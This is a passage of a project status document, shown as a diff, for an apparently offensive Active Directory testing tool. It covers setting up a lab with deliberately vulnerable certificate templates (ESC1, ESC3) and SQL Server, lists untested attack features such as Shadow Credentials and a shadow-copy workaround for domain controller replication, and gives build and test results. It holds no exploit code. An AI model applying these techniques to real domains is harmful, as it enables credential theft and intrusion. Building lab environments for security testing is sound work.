+- Firewall rules for ADCS (80, 135), MSSQL (1433, 1434)
+
+### 14.4 Infrastructure Setup Guide
+
+**Document**: `docs/GOAD-LIGHT-SETUP.md` — comprehensive guide for the operator.
+
+Covers:
+- Step 1: Copy and run setup script (via RDP or WinRM)
+- Step 2: Verify ADCS Web Enrollment
+- Step 3: Configure vulnerable templates (ESC1, ESC3)
+- Step 4: Install SQL Server Express
+- Step 5: Verify full attack surface
+- Network connectivity troubleshooting
+- Full verification workflow (50+ commands in 6 phases)
+
+### 14.5 Remaining Gaps (requires DC access to test)
+
+| # | Gap | Blocking | Workaround |
+|---|-----|----------|------------|
+| 1 | Shadow Credentials rc=21 fix not live-tested | Lab unreachable (192.168.57.0/24 from different subnet) | Test when VPN/routing established |
+| 2 | ADCS Auto ESC3/ESC2 not live-tested | Same network issue | Test after connectivity |
+| 3 | ADCS Web Enrollment IIS not installed | Requires RDP/WinRM to DC | Run `scripts/setup-adcs-infra.ps1` on DC |
+| 4 | MSSQL not installed on DC | Requires manual SQL download | Install per docs/GOAD-LIGHT-SETUP.md |
+| 5 | DRSUAPI named pipe 0xC0000034 on WS2025 | WS2025 RPC endpoint behavior | Use VSS+SMB @GMT shadow copy instead |
+| 6 | SMB2 signing WS2025 quirk (intermittent 1-per-session signature failure) | WS2025 server behavior | Handled gracefully — `recv_verified` disables verification for session |
+
+### 14.6 Build/Test Status
+
+- `cargo build --workspace`: ✅ (requires `--release` on low-disk hosts)
+- `cargo clippy --workspace --lib --bins -- -D warnings`: ✅
+- `cargo test -p overthrone-core --lib --release`: ✅ (856 tests)
+- `cargo test -p overthrone-forge --lib --release`: ✅ (107 tests)
+- Total test suite: **1,845+** (all pass, 0 failures)
+
